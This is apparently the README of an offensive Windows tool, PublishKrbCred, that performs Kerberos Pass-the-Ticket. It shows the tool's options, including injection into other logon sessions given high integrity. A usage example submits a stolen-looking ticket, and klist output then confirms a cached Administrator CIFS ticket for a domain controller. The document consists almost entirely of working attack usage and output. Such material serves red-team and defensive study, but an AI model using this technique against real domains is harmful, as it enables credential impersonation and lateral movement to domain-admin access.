## About
Conduct Pass-the-Ticket

## Usage
```
PS C:\Users\max\Downloads> .\PublishKrbCred_net462.exe --help
Description:
  Submit provided KRB credential to the specified security context

Usage:
  PublishKrbCred_net462 [options]

Options:
  --ticket <ticket>    KRB credential for PTT
  --session <session>  security-context luid. 0 for self. High integrity is required for external session injection.
  --version            Show version information
  -?, -h, --help       Show help and usage information
```

PTT:
```
PS C:\Users\max\Downloads> .\PublishKrbCred_net462.exe --session 0 --ticket 'doIGDDCCBgigAwIBBaEDAgEWooIFETCCBQ1hggUJMIIFBaADAgEFoQ8bDUNPTlRPU08uTE9DQUyiGjAYoAMCAQKhETAPGwRDSUZTGwdXSU4tREMxo4IEzzCCBMugAwIBEqEDAgEGooIEvQSCBLkMQGpWwsAsGwfLBBNOKYNMuXegUcV6WH07ztxnk/...'
[#] LUID = 5092338
[#] Credential submitted

PS C:\Users\max\Downloads> klist

Current LogonId is 0:0x4db3f2

Cached Tickets: (1)

#0>     Client: Administrator @ CONTOSO.LOCAL
        Server: CIFS/WIN-DC1 @ CONTOSO.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 7/8/2025 17:09:24 (local)
        End Time:   7/9/2025 3:06:33 (local)
        Renew Time: 7/15/2025 17:06:33 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```
